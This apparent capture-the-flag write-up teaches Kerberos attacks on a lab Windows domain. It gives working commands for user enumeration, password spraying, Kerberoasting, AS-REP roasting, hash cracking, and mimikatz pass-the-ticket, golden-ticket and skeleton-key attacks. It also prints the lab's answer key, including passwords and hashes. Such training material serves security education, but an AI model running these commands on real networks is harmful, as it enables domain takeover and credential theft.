**Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller**

## Introduction
+ default authentication service for Microsoft Windows domains.
+ more "secure" than NTLM by using third party ticket authorization as well as stronger encryption.

### **Common Terminology**
+ **Ticket Granting Ticket (TGT** 
  + ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
+ **Key Distribution Center (KDC)**
  + Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
+ **Authentication Service (AS)**
  + Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
+ **Ticket Granting Service (TGS)**
  + Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
+ **Service Principal Name (SPN)**
  + Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account.
+ **KDC Long Term Secret Key (KDC LT Key)**
  + KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
+ **Client Long Term Secret Key (Client LT Key)**
  + client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
+ **Service Long Term Secret Key (Service LT Key)**
  + service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
+ **Session Key**
  + Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
+ **Privilege Attribute Certificate (PAC)**
  + The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### AS-REQ w/ Pre-Authentication In Detail
+  validate the user and create a TGT for the user,
   +  user must encrypt a timestamp NT hash and send it to the AS
   +  The KDC attempts to decrypt the timestamp using the NT hash from the user
      +  if successful the KDC will issue a TGT as well as a session key for the user.

### Ticket Granting Ticket Contents
+ the TGT is provided by the user to the KDC
+ the KDC validates the TGT and returns a service ticket.

### Service Ticket Contents
+ Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
+ User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

### Kerberos Authentication Overview

_Full screen width and center alignment_ 

+ AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
+ AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
+ TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access. 
+ TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
+ AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
+ AP-REP - 6.) The service grants access

### Kerberos Tickets Overview
+ ticket is typically base64 encoded and can be used for various attacks.
+ ticket-granting ticket is only used with the KDC in order to get service tickets.
+ KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

### Attack Privilege Requirements
+ Kerbrute Enumeration - No domain access required 
+ Pass the Ticket - Access as a user to the domain required
+ Kerberoasting - Access as any user required
+ AS-REP Roasting - Access as any user required
+ Golden Ticket - Full domain compromise (domain admin) required 
+ Silver Ticket - Service hash required
+ Skeleton Key - Full domain compromise (domain admin) required

### Questions
1. What does TGT stand for?
+ `Ticket Granting Ticket`
2. What does SPN stand for?
+ `Service Principal Name`
3. What does PAC stand for?
+ `Privilege Attribute Certificate`
4. What two services make up the KDC?
+ `AS, TGS`

## Enumeration w/ Kerbrute 
+ enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.


### Kerbrute Installation
1. Download a precompiled binary for your OS [kerbrute](https://github.com/ropnop/kerbrute/releases)
2. Rename `kerbrute_linux_amd64` to kerbrute
3. make kerbrute executable
```bash
chmod +x kerbrute
```

### Enumerating Users w/ Kerbrute
1. cd into the directory that you put Kerbrute
2. Download the wordlist
3. This will brute force user accounts from a domain controller using a supplied wordlist
```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### Questions
1. How many total users do we enumerate?
+ `10`
2. What is the SQL service account name?
+ `sqlservice`
3. What is the second "machine" account name?
+ `machine2`
4. What is the third "user" account name?
+ `user3`

## Harvesting & Brute-Forcing Tickets w/ Rubeus 

+ Rubeus is a powerful tool for attacking Kerberos
+ Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos
  + `overpass the hash`
  + `ticket requests and renewals`
  + `ticket management`
  + `ticket extraction`
  + `harvesting`
  + `pass the ticket`
  + `AS-REP Roasting`
  + `Kerberoasting`

### Harvesting Tickets w/ Rubeus
+ Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

  + `cd Downloads` navigate to the directory Rubeus is in
  + This command tells Rubeus to harvest for TGTs every 30 seconds
```bash
Rubeus.exe harvest /interval:30
```

### Brute-Forcing / Password-Spraying w/ Rubeus
+  add the domain controller domain name to the windows host file
```bash
echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
+ **Password spraying with Rubeus**
  + `cd Downloads` - navigate to the directory Rubeus is in
  + `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

### Questions
1. Which domain admin do we get a ticket for when harvesting tickets?
  + `Administrator`

2. Which domain controller do we get a ticket for when harvesting tickets?
   + `CONTROLLER-1`

## Kerberoasting w/ Rubeus & Impacket
+  **Kerberoasting** allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password
   +  If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is
   +  if it is trackable as well as the privileges of the cracked service account.

### Method 1 - Rubeus

#### **Kerberoasting w/ Rubeus**

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users
  ![Desktop View](https://i.imgur.com/XZegVqf.png){: width="972" height="589" }
  _Full screen width and center alignment_
  + copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
3. now crack that hash
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### Method 2 - Impacket
### Impacket Installation
Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
1. `cd /opt` navigate to your preferred directory to save tools in
2. download the precompiled package from [impacket 0.9.19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)
3. `cd Impacket-0.9.19` navigate to the impacket directory
4. `pip install .` - this will install all needed dependencies

### Kerberoasting w/ Impacket
1. navigate to where GetUserSPNs.py is located
```bash
cd /usr/share/doc/python3-impacket/examples/
```
2. this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
```bash
sudo impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
```
3. now crack that hash
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```
### Kerberoasting Mitigation  
+ `Strong Service Passwords` - If the service account passwords are strong then kerberoasting will be ineffective
+ `Don't Make Service Accounts Domain Admins` - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

### Questions
1. What is the HTTPService Password?
  + `Summer2020`
2. What is the SQLService Password?
  + `MYPassword123#`

## AS-REP Roasting w/ Rubeus
+ similar to Kerberoasting
+ dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.

### Dumping KRBASREP5 Hashes w/ Rubeus
+ `cd Downloads` - navigate to the directory Rubeus is in
+ `Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
![Desktop View](https://i.imgur.com/l3wJhby.png){: width="972" height="589" }
_Full screen width and center alignment_ 

### Crack those Hashes w/ hashcat
1. Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
2. Insert 23$ after `$krb5asrep$` so that the first line will be `$krb5asrep$23$User......`
3. crack those hashes! Rubeus AS-REP Roasting uses hashcat mode `18200`
```bash
hashcat -m 18200 hash.txt Pass.txt
```

_Full screen width and center alignment_ 

### AS-REP Roasting Mitigations
+ Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
+ Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

### Questions
1. What hash type does AS-REP Roasting use? 
  + `Kerberos 5 AS-REP etype 23`
2. Which User is vulnerable to AS-REP Roasting?
   + `User3`
3. What is the User's Password?
  + `Password3`
4. Which Admin is vulnerable to AS-REP Roasting?
  + Admin2
5. What is the Admin's Password?
  + `P@$$W0rd2`

## Pass the Ticket w/ mimikatz
+ Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network
+ dump a TGT from LSASS memory

### Pass the Ticket Overview
+ Local Security Authority Subsystem Service (LSASS)
  + stores credentials on an active directory server
  + store Kerberos ticket along with other credential types
  + act as the gatekeeper and accept or reject the credentials provided

### Prepare Mimikatz & Dump Tickets
1. `cd Downloads` - navigate to the directory mimikatz is in
2. `mimikatz.exe` - run mimikatz
3. `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
   ![Desktop View](https://i.imgur.com/SJQGplV.png){: width="972" height="589" }
  _Full screen width and center alignment_ 
1. `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in

### Pass the Ticket w/ Mimikatz
1. `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
  ![Desktop View](https://i.imgur.com/DwXmm8Z.png){: width="972" height="589" }
  _Full screen width and center alignment_ 
2. `klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. 
  ![Desktop View](https://i.imgur.com/GgxDm9k.png){: width="972" height="589" }
  _Full screen width and center alignment_ 
3. You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

## Golden/Silver Ticket Attacks w/ mimikatz
### KRBTGT Overview
+ KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients.

### Golden/Silver Ticket Attack Overview
+ A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden and silver ticket you would dump the krbtgt ticket.

### Dump the krbtgt hash
1. `cd downloads && mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz
2. `privilege::debug` - ensure this outputs [privilege '20' ok]
3. `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

### Create a Golden/Silver Ticket
1. `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

_Full screen width and center alignment_ 

### Use the Golden/Silver Ticket to access other machines
1. `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

  ![Desktop View](https://i.imgur.com/6HnEnwi.png){: width="972" height="589" }
_Full screen width and center alignment_ 

2. Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket

### Questions
1. What is the SQLService NTLM Hash?
   + `cd40c9ed96265531b21fc5b1dafcfb0a`
2. What is the Administrator NTLM Hash?
   + `2777b7fec870e04dda00cd7260f7bee6`

## Kerberos Backdoors w/ mimikatz
+ The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -"mimikatz"

### Skeleton Key Overview
+ works by abusing the AS-REQ encrypted timestamps
+ timestamp is encrypted with the users NT hash
+ domain controller then tries to decrypt this timestamp with the users NT hash
+ domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

### Preparing Mimikatz
1. `cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz
2. `privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access
  ![Desktop View](https://i.imgur.com/ZPOMDMo.png){: width="972" height="589" }
_Full screen width and center alignment_ 

### Installing the Skeleton Key w/ mimikatz
1. `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful

  ![Desktop View](https://i.imgur.com/wI802gw.png){: width="972" height="589" }
_Full screen width and center alignment_ 

### Accessing the forest
+ The default credentials will be: **"mimikatz"**
+ example: net use `c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password
+ example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+ The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
